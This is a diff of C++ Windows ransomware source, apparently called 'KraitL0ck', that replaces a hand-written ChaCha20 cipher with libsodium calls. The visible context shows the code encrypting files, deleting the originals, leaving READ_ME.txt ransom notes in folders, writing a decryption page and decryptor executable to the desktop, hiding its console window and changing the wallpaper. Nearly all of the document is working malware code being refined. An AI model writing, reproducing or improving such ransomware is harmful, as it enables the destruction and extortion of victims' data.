@@ -11,66 +11,10 @@
 #include <sstream>
 #include <iomanip>
 #include <cstring>
+#include <sodium.h>
 
 namespace fs = std::filesystem;
 using namespace std;
-
-// ==================== ChaCha20 ====================
-#define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
-#define QR(a, b, c, d) \
-    a += b; d ^= a; d = ROTL32(d, 16); \
-    c += d; b ^= c; b = ROTL32(b, 12); \
-    a += b; d ^= a; d = ROTL32(d, 8);  \
-    c += d; b ^= c; b = ROTL32(b, 7);
-
-struct chacha20_ctx {
-    uint32_t state[16];
-    uint8_t nonce[12];
-    uint32_t counter;
-};
-
-static void chacha20_init(chacha20_ctx* ctx, const uint8_t* key, const uint8_t* nonce, uint32_t counter) {
-    const uint32_t constants[4] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574};
-    memcpy(&ctx->state[0], constants, 16);
-    memcpy(&ctx->state[4], key, 32);
-    memcpy(&ctx->state[12], nonce, 12);
-    ctx->state[14] = counter;
-    ctx->state[15] = 0;
-    memcpy(ctx->nonce, nonce, 12);
-    ctx->counter = counter;
-}
-
-static void chacha20_block(chacha20_ctx* ctx, uint8_t* output) {
-    uint32_t x[16];
-    memcpy(x, ctx->state, 64);
-    for (int i = 0; i < 10; i++) {
-        QR(x[0], x[4], x[8],  x[12]);
-        QR(x[1], x[5], x[9],  x[13]);
-        QR(x[2], x[6], x[10], x[14]);
-        QR(x[3], x[7], x[11], x[15]);
-        QR(x[0], x[5], x[10], x[15]);
-        QR(x[1], x[6], x[11], x[12]);
-        QR(x[2], x[7], x[8],  x[13]);
-        QR(x[3], x[4], x[9],  x[14]);
-    }
-    for (int i = 0; i < 16; i++) x[i] += ctx->state[i];
-    memcpy(output, x, 64);
-    ctx->state[12]++;
-    if (ctx->state[12] == 0) ctx->state[13]++;
-}
-
-static void chacha20_crypt(chacha20_ctx* ctx, const uint8_t* input, uint8_t* output, size_t length) {
-    uint8_t block[64];
-    size_t pos = 0;
-    while (pos < length) {
-        chacha20_block(ctx, block);
-        size_t remaining = length - pos;
-        size_t to_copy = (remaining < 64) ? remaining : 64;
-        for (size_t i = 0; i < to_copy; i++) output[pos + i] = input[pos + i] ^ block[i];
-        pos += to_copy;
-    }
-}
-// ==================================================
 
 // ==================== Ключи ====================
 static vector<uint8_t> SHA256(const vector<uint8_t>& data) {
@@ -192,24 +136,15 @@ void EncryptFile(const string& filePath, const vector<uint8_t>& key) {
     in.read((char*)data.data(), size);
     in.close();
 
-    uint8_t nonce[12];
-    HCRYPTPROV hProv;
-    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
-        CryptGenRandom(hProv, 12, nonce);
-        CryptReleaseContext(hProv, 0);
-    } else {
-        memset(nonce, 0, 12);
-    }
+    uint8_t nonce[crypto_stream_chacha20_NONCEBYTES];
+    randombytes_buf(nonce, sizeof(nonce));
 
     vector<uint8_t> encrypted(size);
-    chacha20_ctx ctx;
-    chacha20_init(&ctx, key.data(), nonce, 0);
-    chacha20_crypt(&ctx, data.data(), encrypted.data(), size);
-    chacha20_free(&ctx);
+    crypto_stream_chacha20_xor(encrypted.data(), data.data(), size, nonce, key.data());
 
     string newPath = filePath + ".KraitL0ck";
     ofstream out(newPath, ios::binary);
-    out.write((char*)nonce, 12);
+    out.write((char*)nonce, sizeof(nonce));
     out.write((char*)encrypted.data(), encrypted.size());
     out.close();
     DeleteFileA(filePath.c_str());
@@ -236,7 +171,6 @@ void EncryptDirectory(const string& dir, const vector<uint8_t>& key, const strin
             if (stopFlag) break;
             EncryptFile(file, key);
         }
-        // READ_ME.txt
         string readme = dir + "\\READ_ME.txt";
         ofstream f(readme);
         if (f) {
@@ -278,7 +212,6 @@ void CreateDesktopFiles(const string& personalKey) {
     SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop);
     string d = string(desktop);
 
-    // KRAIT_DECRYPT.html
     string html = d + "\\KRAIT_DECRYPT.html";
     ofstream h(html);
     if (h) {
@@ -329,7 +262,6 @@ function decrypt() {
 )";
     }
 
-    // KRAIT.exe (дешифратор из ресурсов)
     string exe = d + "\\KRAIT.exe";
     ExtractResource(101, exe);
 }
@@ -348,6 +280,7 @@ void SetWallpaper() {
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE, LPSTR, int) {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+    if (sodium_init() < 0) return 1;
 
     auto masterKey = GenerateMasterKey();
     string personalKey = GeneratePersonalKey(masterKey);
